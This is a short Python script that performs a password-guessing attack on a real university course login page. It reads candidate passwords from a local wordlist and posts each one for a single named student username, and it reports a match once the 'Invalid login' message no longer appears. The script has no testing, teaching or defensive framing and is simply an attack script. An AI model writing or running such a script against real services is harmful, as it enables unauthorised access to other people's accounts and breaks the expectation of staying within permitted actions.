import requests

target_url = "https://courses.christuniversity.in/login/index.php"
data_dict = {"username":"1641034" , "password": "" , "loginbtn": "submit"}

with open("/root/Desktop/stupass.txt", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if " Invalid login " not in response.content:
            print("[+] Got the password -->" + word)
            exit()


print("[+] reached end of the file")

